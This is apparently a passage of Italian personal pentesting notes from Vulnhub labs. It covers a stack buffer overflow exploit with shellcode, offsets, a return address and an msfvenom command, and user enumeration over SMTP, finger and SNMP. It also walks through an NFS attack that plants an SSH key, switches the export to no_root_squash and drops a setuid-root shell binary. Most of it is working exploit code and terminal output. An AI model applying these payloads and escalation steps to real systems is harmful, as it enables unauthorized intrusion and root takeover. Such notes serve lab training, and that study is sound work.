payload = ("\xba\x13\x24\xb9\x47\xda\xc3\xd9\x74\x24\xf4\x5e"
"\x2b\xc9\xb1\x12\x83\xc6\x04\x31\x56\x0e\x03\x45"
"\x2a\x5b\xb2\x58\xe9\x6c\xde\xc9\x4e\xc0\x4b\xef"
"\xd9\x07\x3b\x89\x14\x47\xaf\x0c\x17\x77\x1d\x2e"
"\x1e\xf1\x64\x46\x61\xa9\x96\xeb\x09\xa8\x98\x06"
"\x79\x25\x79\x98\x1b\x66\x2b\x8b\x50\x85\x42\xca"
"\x5a\x0a\x06\x64\x0b\x24\xd4\x1c\xbb\x15\x35\xbe"
"\x52\xe3\xaa\x6c\xf6\x7a\xcd\x20\xf3\xb1\x8e")

Aggiungere anche:
nop_size = 20
padding = "\x90" * nop_size

20. Mettere in listening ed eseguire exploit.py



##### Linux

1. Trovare la lunghezza di stringa che fa crashare l'applicativo, per generare si può eseguire da gdb:
```run $(python -c "print('A'*100)")```

Aumentando fino a che non crasha

2. Trovata la lunghezza (in questo caso 200), generare il payload:
```
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

3. Rieseguire l'applicativo con la stringa generata al punto 2:
```
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x39644138 in ?? ()
```

4. Per trovare l'offset, si prende l'indirizzo di memoria che dà gdb quando l'applicativo crasha:
```
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39644138 
[*] Exact match at offset 116
```

5. Si testa se effettivamente l'offset è giusto:
```
(gdb) run $(python -c "print('A'*116 + 'BBBB' + 'C'*(200-116-4))")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate $(python -c "print('A'*116 + 'BBBB' + 'C'*(200-116-4))")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```



6. Si deve trovare il return address: (l'applicativo in questo caso si chiama **validate**)
objdump -D *nome_applicativo* | grep call| grep eax
```
└─$ objdump -D validate | grep call| grep eax
 8048468:	ff 14 85 14 9f 04 08 	call   *0x8049f14(,%eax,4)
 80484af:	ff d0                	call   *%eax
 804862b:	ff d0                	call   *%eax
```

7. Ora si può inserire una shellcode con il return address: (In questo caso la shellcode stampa solo la stringa "Owned!!!")
```
gdb-peda$ run $(python2.7 -c "import struct; shellcode='\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80'; print('\x90'*10+shellcode +'A'*(116-10-len(shellcode)) + struct.pack('<I', 0x080484af))")


Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate $(python2.7 -c "import struct; shellcode='\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80'; print('\x90'*10+shellcode +'A'*(116-10-len(shellcode)) + struct.pack('<I', 0x080484af))")
Owned!!![Inferior 1 (process 101558) exited normally]
```

**shellcode for /bin/sh**
shellcode =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x5
8\xcd\x80"

**Oppure si può generare con:**
msfvenom -p linux/x86/exec CMD=/bin/sh -a x86 -b ‘x00x0ax0dx20x46’ -e x86/shikata_ga_nai -f c


Per i bad characters:
```
run $(python -c"print('A'*116+'BBBB'+'\x90'*16+'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')")
```

Cioè:
```
gdb-peda$ run $(python -c"print('A'*116+'BBBB'+'\x90'*16+'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')")
Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate $(python -c"print('A'*116+'BBBB'+'\x90'*16+'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')")

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffcce8 ('A' <repeats 116 times>, "BBBB", '\302\220' <repeats 16 times>, "\001\002\003\004\005\006\a\b")
EBX: 0x41414141 ('AAAA')
ECX: 0xffffd0d0 --> 0xd0c0b00 ('')
EDX: 0xffffcd88 --> 0x0 
ESI: 0xf7fa9000 --> 0x1e4d6c 
EDI: 0xf7fa9000 --> 0x1e4d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffcd60 --> 0x90c290c2 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffcd60 --> 0x90c290c2 
0004| 0xffffcd64 --> 0x90c290c2 
0008| 0xffffcd68 --> 0x90c290c2 
0012| 0xffffcd6c --> 0x90c290c2 
0016| 0xffffcd70 --> 0x90c290c2 
0020| 0xffffcd74 --> 0x90c290c2 
0024| 0xffffcd78 --> 0x90c290c2 
0028| 0xffffcd7c --> 0x90c290c2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

L'applicativo crasha e si vede la memoria con il comando ```x/100x $eax```
```
gdb-peda$ x/100x $eax
0xffffcce8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffccf8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd08:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd18:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd28:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd38:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd48:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd58:	0x41414141	0x42424242	0x90c290c2	0x90c290c2
0xffffcd68:	0x90c290c2	0x90c290c2	0x90c290c2	0x90c290c2
0xffffcd78:	0x90c290c2	0x90c290c2	0x04030201	0x08070605
0xffffcd88:	0x00000000	0xf7de2e46	0x00000004	0xffffce34
0xffffcd98:	0xffffce48	0xffffcdc4	0xffffcdd4	0xf7ffdb40
0xffffcda8:	0xf7fca410	0xf7fa9000	0x00000001	0x00000000
0xffffcdb8:	0xffffce18	0x00000000	0xf7ffd000	0x00000000
0xffffcdc8:	0xf7fa9000	0xf7fa9000	0x00000000	0x6359a04d
0xffffcdd8:	0x20997e5d	0x00000000	0x00000000	0x00000000
0xffffcde8:	0x00000004	0x08048400	0x00000000	0xf7fe88f0
0xffffcdf8:	0xf7fe3230	0xf7ffd000	0x00000004	0x08048400
0xffffce08:	0x00000000	0x08048421	0x08048538	0x00000004
0xffffce18:	0xffffce34	0x080485b0	0x080485a0	0xf7fe3230
0xffffce28:	0xffffce2c	0x0000001c	0x00000004	0xffffd000
0xffffce38:	0xffffd030	0xffffd0d1	0xffffd0e7	0x00000000
0xffffce48:	0xffffd247	0xffffd275	0xffffd2c1	0xffffd2d3
0xffffce58:	0xffffd2e3	0xffffd2fc	0xffffd329	0xffffd359
0xffffce68:	0xffffd397	0xffffd3b8	0xffffd3c2	0xffffd3d8
```

All'indirizzo di memoria 0xffffcd78 si vede che il payload che ho inserito arriva fino a \x08 e poi c'è \x00 nell'indirizzo di memoria successivo, questo vuol dire che \x09 è un bad characters

E si continua così fino a quando o il payload è troppo lungo e quindi l'applicativo non crasha, oppure crasha ma ci sono tutti i caratteri che si sono inseriti nel payload



### SMTP (port 23)
```
└─$ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.1.102
```

Con metasploit: auxiliary/scanner/smtp/smtp_enum


### Linux fingerd (port 79)

Con metasploit: auxiliary/scanner/finger/finger_users

Per enumerazione utenti: (Sta in **~/Programs**)
https://github.com/Kan1shka9/Finger-User-Enumeration
```
./finger_enum_user.sh ~/Documents/Vulnhub/Hacklab_Vulnix/user.txt
```

Sample output:
```
$ ./finger_enum_user.sh users.txt
User : user
Login: user           			Name: user
Directory: /home/user               	Shell: /bin/bash
Last login Tue May 16 01:47 (BST) on pts/0 from 192.168.1.34
No mail.
No Plan.

Login: dovenull       			Name: Dovecot login user
Directory: /nonexistent             	Shell: /bin/false
Never logged in.
No mail.
No Plan.
```

N.B Check for the parameter "Directory:" in the output, if /home/username means that it is a valid user on the system.



### NFS (Port 2049)
```
└─$ showmount -e 192.168.1.102
Export list for 192.168.1.102:
/home/vulnix *
``` 
```
(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ mkdir home2

(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ mount -t nfs 192.168.1.102:/home/vulnix home2 -o nolock
```

Oppure usare **nfsshell**:
```
└─$ sudo ./nfsshell
nfs> host 192.168.1.102
Using a privileged port (1023)
Open 192.168.1.102 (192.168.1.102) TCP
nfs> export
Export list for 192.168.1.102:
/home/vulnix             * 
nfs> mount ~/Documents/Vulnhub/Hacklab_Vulnix/home/
Using a privileged port (1022)
Mount failed: Permission denied
```

In questo caso non ho i permessi per vedere il contenuto della cartella però utilizzando i comandi ```uid``` e ```gid``` posso settare i permessi giusti dell'utente per vedere il contenuto.
Quindi metti caso che sei entrato in ssh con un utente, tu prendi da /etc/passwd 
```
vulnix:x:2008:2008::/home/vulnix:/bin/bash
```

Si può o settare l'uid con nfsshell:
```
nfs> uid 2008
nfs> ls
.
..
.bash_history
.bash_logout
.bashrc
.cache
.profile
```

Oppure si può aggiungere nella propria macchina un utente con quell'uid:
```
└─$ sudo useradd -u 2008 vulnix
                                                                                                                  
(base) ┌──(kali㉿kali)-[~/Programs/unix-privesc-check-1.4]
└─$ tail /etc/passwd
king-phisher:x:132:140::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
pwn:x:1004:1004:,,,:/home/pwn:/bin/bash
uuidd:x:134:143::/run/uuidd:/usr/sbin/nologin
ftpuser:x:1006:1006::/dev/null:/etc
ftp:x:133:142:ftp daemon,,,:/var/ftp:/bin/false
beef-xss:x:135:144::/var/lib/beef-xss:/usr/sbin/nologin
redis:x:136:145::/var/lib/redis:/usr/sbin/nologin
vulnix:x:2008:2008::/home/vulnix:/bin/sh
```

E poi si monta la directory da root e poi si passa all'utente creato:
```
┌──(root💀kali)-[/home/kali/Programs/unix-privesc-check-1.4]
└─$ mount -t nfs 192.168.1.102:/home/vulnix /home/kali/Documents/Vulnhub/Hacklab_Vulnix/home -o nolock
                                                                                                                                                               
┌──(root💀kali)-[/home/kali/Programs/unix-privesc-check-1.4]
└─# su vulnix
$ cd /home/kali/Documents/Vulnhub/Hacklab_Vulnix/home
$ ls -la
total 20
drwxr-x--- 2 vulnix vulnix 4096 Sep  2  2012 .
drwxr-xr-x 3 kali   kali   4096 Jun  6 11:20 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
```

Poi per continuare l'attacco, si può inserire una chiave ssh in questa directory:
1. Genero chiave:
```
(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ ssh-keygen            
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsa_vulnix
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa_vulnix
Your public key has been saved in id_rsa_vulnix.pub
The key fingerprint is:
SHA256:NFEWBOcRexrVCkXFRoIUFL0NkfUN63ZRxPmWcRm27kw kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|        o*&X*O==*|
|         =o++.=B*|
|        o +..*.oB|
|       . . +o.o.+|
|        S .   oE.|
|             .+. |
|               o |
|                 |
|                 |
+----[SHA256]-----+

(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ cat id_rsa_vulnix.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa2oTKTIzaYCieWckD9XLCr5FDTwPK2QTfB8JG5P8T6sULeZc0jLCeHEKcFuLGhGVfgBeKLvoOvR9i+LcLqpCTKmNnRmkFdBnUXCB2t5A8RMaLwxU7oKThCVrgB9yX7ccDD4NTHjh9DvfS0ePSqF5Vl3D0UQyLo51aK9sowhlQ9qUOigI0SKQOJRl2i/EZr5MeJlwZICiYn6xRi/TOUca2rz4gwlefoxdHtzNJu6Zk7lMrVEjh0+DZdAjsru6CZPIRaZsPCS995LSRnh0HDk4GFbmekeNmftRxMKGrJqbsCE6x7IoqERRga10mFjjMgz3BTgyjCsKjrqV/TM5Ed2BAA9YsSwXtYOXqnI5WL0deTzw2xqCox25nS8LZwzoF89tXfwEYl5OOBmF7BokmfFVH1dTGZ1POP84rPcZT2eHivAiL17kOrJOUBGpKGkDpYsWA7SlbMJU88W+7UnZkkUtoc9NI0UyMZ3f6eSDyqkPjkZKcm/3kj3FM9TNvR/BhsL8= kali@kali
```

2. Copio il .pub nelle authorized key della macchina:
```
$ mkdir .ssh
$ ls
$ ls -la
total 24
drwxr-x--- 3 vulnix vulnix 4096 Jun  6 07:19 .
drwxr-xr-x 3 kali   kali   4096 Jun  6 11:20 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 07:19 .ssh
$ cd .ssh	
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa2oTKTIzaYCieWckD9XLCr5FDTwPK2QTfB8JG5P8T6sULeZc0jLCeHEKcFuLGhGVfgBeKLvoOvR9i+LcLqpCTKmNnRmkFdBnUXCB2t5A8RMaLwxU7oKThCVrgB9yX7ccDD4NTHjh9DvfS0ePSqF5Vl3D0UQyLo51aK9sowhlQ9qUOigI0SKQOJRl2i/EZr5MeJlwZICiYn6xRi/TOUca2rz4gwlefoxdHtzNJu6Zk7lMrVEjh0+DZdAjsru6CZPIRaZsPCS995LSRnh0HDk4GFbmekeNmftRxMKGrJqbsCE6x7IoqERRga10mFjjMgz3BTgyjCsKjrqV/TM5Ed2BAA9YsSwXtYOXqnI5WL0deTzw2xqCox25nS8LZwzoF89tXfwEYl5OOBmF7BokmfFVH1dTGZ1POP84rPcZT2eHivAiL17kOrJOUBGpKGkDpYsWA7SlbMJU88W+7UnZkkUtoc9NI0UyMZ3f6eSDyqkPjkZKcm/3kj3FM9TNvR/BhsL8= kali@kali >  authorized_keys
$ ls -la
total 12
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 07:20 .
drwxr-x--- 3 vulnix vulnix 4096 Jun  6 07:19 ..
-rw-r--r-- 1 vulnix vulnix  563 Jun  6 07:20 authorized_keys
```

3. Accedo in ssh:
```
(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ ssh -i id_rsa_vulnix vulnix@192.168.1.102
Enter passphrase for key 'id_rsa_vulnix': 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Jun  6 12:21:14 BST 2021

  System load:  0.0              Processes:           88
  Usage of /:   90.3% of 773MB   Users logged in:     0
  Memory usage: 12%              IP address for eth0: 192.168.1.102
  Swap usage:   0%

  => / is using 90.3% of 773MB

  Graph this data and manage this system at https://landscape.canonical.com/

Your Ubuntu release is not supported anymore.
For upgrade information, please visit:
http://www.ubuntu.com/releaseendoflife

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

vulnix@vulnix:~$ ls -la
total 28
drwxr-x--- 4 vulnix vulnix 4096 Jun  6 12:21 .
drwxr-xr-x 4 root   root   4096 Sep  2  2012 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
drwx------ 2 vulnix vulnix 4096 Jun  6 12:21 .cache
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 12:20 .ssh
```

In nfs c'è questa impostazione root_squash
root_squash: Fa in modo che tutti gli accessi dei client al filesystem esportato, effettuati da utenti root sulle macchine client, avvengano come user ID per l'utente nobody. Questo in effetti "declassa" il potere dell'utente root remoto a quello del più semplice utente locale, impedendo una alterazione dei file non autorizzata sul server remoto. In alternativa, l'opzione no_root_squash disabilita questa funzione.

```
vulnix@vulnix:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix	*(rw,root_squash)
```

Vedendo con sudo -l:
```
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

Abbiamo la possibilità di modificare quel file di configurazione per permettere al nostro utente root di scrivere sulla directory nfs.
```
vulnix@vulnix:~$ sudoedit /etc/exports
vulnix@vulnix:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix	*(rw,no_root_squash)
```

Non avendo la possibilità di riavviare il servizio nfs, riavviamo la macchina.
Così riusciamo ad accedere con il nostro root:
```
┌──(root💀kali)-[/home/kali/Documents/Vulnhub/Hacklab_Vulnix]
└─# mount -t nfs 192.168.1.102:/home/vulnix /home/kali/Documents/Vulnhub/Hacklab_Vulnix/home
                                                                                                                                                                        
┌──(root💀kali)-[/home/kali/Documents/Vulnhub/Hacklab_Vulnix]
└─# ls -la home/
total 32
drwxr-x--- 4 vulnix vulnix 4096 Jun  6 07:37 .
drwxr-xr-x 3 kali   kali   4096 Jun  6 11:43 ..
-rw------- 1 vulnix vulnix  338 Jun  6 07:40 .bash_history
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
drwx------ 2 vulnix vulnix 4096 Jun  6 07:21 .cache
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 07:20 .ssh
```

Ora posso creare un file che apre una shell con i permessi di root e caricarla sulla directory nfs per poi avviarla con l'utente con low-privileges:
(Volendo potevo copiargli direttamente /bin/bash (dargli sempre ```chmod 4777 /bin/bash``` e poi sulla macchina vittima dovevo eseguire ```/bin/bash -p``` per far rimanere i privilegi settati) ma essendo architetture diverse, mi dava problemi quando provavo ad eseguirlo poi sulla macchina vittima)
Quindi ho creato un file bash.c:

```
int main()
{
     setgid(0);
     setuid(0);
     system("/bin/bash");
}
```
E l'ho caricato e compilato (perchè sulla macchina vittima non c'era gcc e gli ho dato i permessi di suid)
```
┌──(root💀kali)-[/home/…/Documents/Vulnhub/Hacklab_Vulnix/home]
└─# gcc -o setuid bash.c -m32
bash.c: In function ‘main’:
bash.c:3:6: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    3 |      setgid(0);
      |      ^~~~~~
bash.c:4:6: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    4 |      setuid(0);
      |      ^~~~~~
bash.c:5:6: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    5 |      system("/bin/bash");
      |      ^~~~~~
                                                                                                                  
┌──(root💀kali)-[/home/…/Documents/Vulnhub/Hacklab_Vulnix/home]
└─# chmod 4777 setuid 
```

Poi dalla macchina vittima:
```
vulnix@vulnix:~$ ls -la
total 52
drwxr-x--- 4 vulnix vulnix  4096 Jun  6 17:13 .
drwxr-xr-x 4 root   root    4096 Sep  2  2012 ..
-rw-r--r-- 1 root   root      73 Jun  6 17:13 bash.c
-rw------- 1 vulnix vulnix   359 Jun  6 17:06 .bash_history
-rw-r--r-- 1 vulnix vulnix   220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix  3486 Apr  3  2012 .bashrc
drwx------ 2 vulnix vulnix  4096 Jun  6 12:21 .cache
-rw-r--r-- 1 vulnix vulnix   675 Apr  3  2012 .profile
-rwsrwxrwx 1 root   root   15564 Jun  6 17:13 setuid
drwxr-xr-x 2 vulnix vulnix  4096 Jun  6 12:20 .ssh
vulnix@vulnix:~$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
vulnix@vulnix:~$ exit
exit
vulnix@vulnix:~$ ./setuid 
root@vulnix:~# id
uid=0(root) gid=0(root) groups=0(root),2008(vulnix)
```



### SNMP

Enumeration:
```
(base) ┌──(kali㉿kali)-[~/Programs/Finger-User-Enumeration]
└─$ snmpwalk -v2c -c public 192.168.199.42
```

```
(base) ┌──(kali㉿kali)-[~/Programs/Finger-User-Enumeration]
└─$ snmp-check 192.168.199.42 -c public
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.199.42:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.199.42
  Hostname                      : 0xbabe.local
  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
  Uptime snmp                   : 00:47:18.09
  Uptime system                 : 00:46:46.62
  System date                   : 2021-6-7 10:04:16.0

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 64
  TCP segments received         : 152628
  TCP segments sent             : 149146
